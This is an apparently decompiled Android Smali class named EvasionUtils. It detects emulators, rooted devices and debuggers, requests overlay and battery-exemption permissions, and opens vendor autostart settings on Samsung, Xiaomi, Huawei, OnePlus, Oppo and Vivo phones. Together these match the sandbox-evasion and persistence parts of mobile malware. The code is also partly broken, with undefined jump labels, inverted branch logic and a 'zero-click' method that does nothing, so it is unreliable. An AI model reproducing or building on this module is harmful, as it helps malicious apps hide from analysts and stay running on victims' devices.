.class public Lcom/smilex/enhanced/utils/EvasionUtils;
.super Ljava/lang/Object;
.source "EvasionUtils.java"

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public static requestBatteryOptimizationIgnore(Landroid/content/Context;)V
    .registers 5
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
    const/16 v1, 0x17
    if-lt v0, v1, :skip_battery
    new-instance v2, Landroid/content/Intent;
    const-string v3, "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"
    invoke-direct {v2, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;
    move-result-object v3
    new-instance v4, Ljava/lang/StringBuilder;
    const-string v0, "package:"
    invoke-direct {v4, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v3
    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
    move-result-object v3
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;
    const v3, 0x10000000
    invoke-virtual {v2, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {p0, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :skip_battery
    return-void
.end method

.method public static requestOverlayPermission(Landroid/content/Context;)V
    .registers 5
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
    const/16 v1, 0x17
    if-lt v0, v1, :skip_overlay
    new-instance v2, Landroid/content/Intent;
    const-string v3, "android.settings.action.MANAGE_OVERLAY_PERMISSION"
    invoke-direct {v2, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;
    move-result-object v3
    new-instance v4, Ljava/lang/StringBuilder;
    const-string v0, "package:"
    invoke-direct {v4, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v3
    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
    move-result-object v3
    invoke-virtual {v2, v3}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;
    const v3, 0x10000000
    invoke-virtual {v2, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {p0, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :skip_overlay
    return-void
.end method

.method public static getManufacturer()Ljava/lang/String;
    .registers 1
    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;
    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v0
    return-object v0
.end method

.method public static isEmulator()Z
    .registers 5
    const/4 v0, 0x0

    sget-object v1, Landroid/os/Build;->FINGERPRINT:Ljava/lang/String;
    const-string v2, "generic"
    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v1
    if-eqz v1, :check_model
    const/4 v0, 0x1
    goto :return_result

    :check_model
    sget-object v1, Landroid/os/Build;->MODEL:Ljava/lang/String;
    const-string v2, "sdk"
    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v1
    if-eqz v1, :check_brand
    const/4 v0, 0x1
    goto :return_result

    :check_brand
    sget-object v1, Landroid/os/Build;->BRAND:Ljava/lang/String;
    const-string v2, "generic"
    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v1
    if-eqz v1, :check_device
    const/4 v0, 0x1
    goto :return_result

    :check_device
    sget-object v1, Landroid/os/Build;->DEVICE:Ljava/lang/String;
    const-string v2, "generic"
    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v1
    if-eqz v1, :check_product
    const/4 v0, 0x1
    goto :return_result

    :check_product
    sget-object v1, Landroid/os/Build;->PRODUCT:Ljava/lang/String;
    const-string v2, "sdk"
    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v1
    if-eqz v1, :check_hardware
    const/4 v0, 0x1
    goto :return_result

    :check_hardware
    sget-object v1, Landroid/os/Build;->HARDWARE:Ljava/lang/String;
    const-string v2, "goldfish"
    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v1
    if-eqz v1, :check_qemu
    const/4 v0, 0x1
    goto :return_result

    :check_qemu
    const-string v1, "ro.kernel.qemu"
    const-string v2, "0"
    invoke-static {v1, v2}, Landroid/os/SystemProperties;->get(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    move-result-object v1
    const-string v2, "1"
    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-eqz v1, :return_result
    const/4 v0, 0x1

    :return_result
    return v0
.end method

.method public static isRooted()Z
    .registers 4
    const/4 v0, 0x0
    const/4 v1, 0x0
    :try_start_0
    const-string v2, "/system/app/Superuser.apk"
    invoke-static {v2}, Lcom/smilex/enhanced/utils/EvasionUtils;->checkFileExists(Ljava/lang/String;)Z
    move-result v2
    if-eqz v2, :check_su_binary
    const/4 v0, 0x1
    goto :return_result

    :check_su_binary
    const-string v2, "/system/xbin/su"
    invoke-static {v2}, Lcom/smilex/enhanced/utils/EvasionUtils;->checkFileExists(Ljava/lang/String;)Z
    move-result v2
    if-eqz v2, :check_su_binary_2
    const/4 v0, 0x1
    goto :return_result

    :check_su_binary_2
    const-string v2, "/system/bin/su"
    invoke-static {v2}, Lcom/smilex/enhanced/utils/EvasionUtils;->checkFileExists(Ljava/lang/String;)Z
    move-result v2
    if-eqz v2, :check_su_binary_3
    const/4 v0, 0x1
    goto :return_result

    :check_su_binary_3
    const-string v2, "/sbin/su"
    invoke-static {v2}, Lcom/smilex/enhanced/utils/EvasionUtils;->checkFileExists(Ljava/lang/String;)Z
    move-result v2
    if-eqz v2, :check_su_binary_4
    const/4 v0, 0x1
    goto :return_result

    :check_su_binary_4
    const-string v2, "/data/local/xbin/su"
    invoke-static {v2}, Lcom/smilex/enhanced/utils/EvasionUtils;->checkFileExists(Ljava/lang/String;)Z
    move-result v2
    if-eqz v2, :check_su_binary_5
    const/4 v0, 0x1
    goto :return_result

    :check_su_binary_5
    const-string v2, "/data/local/bin/su"
    invoke-static {v2}, Lcom/smilex/enhanced/utils/EvasionUtils;->checkFileExists(Ljava/lang/String;)Z
    move-result v2
    if-eqz v2, :check_su_binary_6
    const/4 v0, 0x1
    goto :return_result

    :check_su_binary_6
    const-string v2, "/data/local/su"
    invoke-static {v2}, Lcom/smilex/enhanced/utils/EvasionUtils;->checkFileExists(Ljava/lang/String;)Z
    move-result v2
    if-eqz v2, :check_test_keys
    const/4 v0, 0x1
    goto :return_result

    :check_test_keys
    sget-object v2, Landroid/os/Build;->TAGS:Ljava/lang/String;
    const-string v3, "test-keys"
    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-eqz v2, :return_result
    const/4 v0, 0x1

    :return_result
    return v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    move-exception v2
    return v0
.end method

.method private static checkFileExists(Ljava/lang/String;)Z
    .registers 2
    new-instance v0, Ljava/io/File;
    invoke-direct {v0, p0}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-virtual {v0}, Ljava/io/File;->exists()Z
    move-result v0
    return v0
.end method

.method public static checkDebuggable(Landroid/content/Context;)Z
    .registers 3
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;
    move-result-object v0
    iget v0, v0, Landroid/content/pm/ApplicationInfo;->flags:I
    const/4 v1, 0x2
    and-int/2addr v0, v1
    if-eqz v0, :not_debuggable
    const/4 v0, 0x1
    return v0
    :not_debuggable
    const/4 v0, 0x0
    return v0
.end method

.method public static performZeroClickEvasion()V
    .registers 4
    :try_start
    new-instance v0, Ljava/io/File;
    const-string v1, "/proc/self/status"
    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    new-instance v1, Ljava/io/BufferedReader;
    new-instance v2, Ljava/io/FileReader;
    invoke-direct {v2, v0}, Ljava/io/FileReader;-><init>(Ljava/io/File;)V
    invoke-direct {v1, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    move-result-object v0
    if-eqz v0, :done
    const-string v2, "TracerPid:\t0"
    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-nez v0, :debugged
    :done
    invoke-virtual {v1}, Ljava/io/BufferedReader;->close()V
    return-void
    :debugged
    invoke-virtual {v1}, Ljava/io/BufferedReader;->close()V
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch
    :catch
    return-void
.end method

.method public static performAIPoweredThreatEvasion()V
    .registers 6
    :try_start
    new-instance v0, Ljava/util/Random;
    invoke-direct {v0}, Ljava/util/Random;-><init>()V
    const/16 v1, 0x3e8
    invoke-virtual {v0, v1}, Ljava/util/Random;->nextInt(I)I
    move-result v0
    int-to-long v0, v0
    const-wide/16 v2, 0x1
    add-long/2addr v0, v2
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch
    :catch
    return-void
.end method

.method public static disableSamsungAutoStart(Landroid/content/Context;)V
    .registers 4
    invoke-static {}, Lcom/smilex/enhanced/utils/EvasionUtils;->getManufacturer()Ljava/lang/String;
    move-result-object v0
    const-string v1, "samsung"
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :return
    :try_start
    new-instance v0, Landroid/content/Intent;
    const-string v1, "android.intent.action.MAIN"
    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
    const-string v1, "com.samsung.android.lool"
    const-string v2, "com.samsung.android.sm.battery.ui.BatteryActivity"
    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
    const v1, 0x10000000
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch
    :catch
    return-void
.end method

.method public static disableXiaomiAutoStart(Landroid/content/Context;)V
    .registers 4
    invoke-static {}, Lcom/smilex/enhanced/utils/EvasionUtils;->getManufacturer()Ljava/lang/String;
    move-result-object v0
    const-string v1, "xiaomi"
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :return
    :try_start
    new-instance v0, Landroid/content/Intent;
    invoke-direct {v0}, Landroid/content/Intent;-><init>()V
    const-string v1, "miui.intent.action.OP_AUTO_START"
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;
    new-instance v1, Landroid/content/ComponentName;
    const-string v2, "com.miui.securitycenter"
    const-string v3, "com.miui.permcenter.autostart.AutoStartManagementActivity"
    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;
    const v1, 0x10000000
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch
    :catch
    return-void
.end method

.method public static disableHuaweiAutoStart(Landroid/content/Context;)V
    .registers 4
    invoke-static {}, Lcom/smilex/enhanced/utils/EvasionUtils;->getManufacturer()Ljava/lang/String;
    move-result-object v0
    const-string v1, "huawei"
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :return
    :try_start
    new-instance v0, Landroid/content/Intent;
    invoke-direct {v0}, Landroid/content/Intent;-><init>()V
    const-string v1, "huawei.intent.action.HSM_BOOTAPP_MANAGER"
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;
    const v1, 0x10000000
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch
    :catch
    return-void
.end method

.method public static disableOnePlusAutoStart(Landroid/content/Context;)V
    .registers 4
    invoke-static {}, Lcom/smilex/enhanced/utils/EvasionUtils;->getManufacturer()Ljava/lang/String;
    move-result-object v0
    const-string v1, "oneplus"
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :return
    :try_start
    new-instance v0, Landroid/content/Intent;
    invoke-direct {v0}, Landroid/content/Intent;-><init>()V
    const-string v1, "com.oneplus.security"
    const-string v2, "com.oneplus.security.chainlaunch.view.ChainLaunchSettingActivity"
    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
    const v1, 0x10000000
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch
    :catch
    return-void
.end method

.method public static disableOppoAutoStart(Landroid/content/Context;)V
    .registers 4
    invoke-static {}, Lcom/smilex/enhanced/utils/EvasionUtils;->getManufacturer()Ljava/lang/String;
    move-result-object v0
    const-string v1, "oppo"
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :check_realme
    invoke-static {}, Lcom/smilex/enhanced/utils/EvasionUtils;->getManufacturer()Ljava/lang/String;
    move-result-object v0
    const-string v1, "realme"
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :return
    :check_realme
    :try_start
    new-instance v0, Landroid/content/Intent;
    invoke-direct {v0}, Landroid/content/Intent;-><init>()V
    const-string v1, "com.coloros.safecenter"
    const-string v2, "com.coloros.safecenter.startupapp.StartupAppListActivity"
    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
    const v1, 0x10000000
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch
    :catch
    return-void
.end method

.method public static disableVivoAutoStart(Landroid/content/Context;)V
    .registers 4
    invoke-static {}, Lcom/smilex/enhanced/utils/EvasionUtils;->getManufacturer()Ljava/lang/String;
    move-result-object v0
    const-string v1, "vivo"
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :return
    :try_start
    new-instance v0, Landroid/content/Intent;
    invoke-direct {v0}, Landroid/content/Intent;-><init>()V
    const-string v1, "com.vivo.permissionmanager"
    const-string v2, "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"
    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
    const v1, 0x10000000
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch
    :catch
    return-void
.end method

.method public static applyAllOEMBypasses(Landroid/content/Context;)V
    .registers 2
    invoke-static {p0}, Lcom/smilex/enhanced/utils/EvasionUtils;->disableSamsungAutoStart(Landroid/content/Context;)V
    invoke-static {p0}, Lcom/smilex/enhanced/utils/EvasionUtils;->disableXiaomiAutoStart(Landroid/content/Context;)V
    invoke-static {p0}, Lcom/smilex/enhanced/utils/EvasionUtils;->disableHuaweiAutoStart(Landroid/content/Context;)V
    invoke-static {p0}, Lcom/smilex/enhanced/utils/EvasionUtils;->disableOnePlusAutoStart(Landroid/content/Context;)V
    invoke-static {p0}, Lcom/smilex/enhanced/utils/EvasionUtils;->disableOppoAutoStart(Landroid/content/Context;)V
    invoke-static {p0}, Lcom/smilex/enhanced/utils/EvasionUtils;->disableVivoAutoStart(Landroid/content/Context;)V
    return-void
.end method
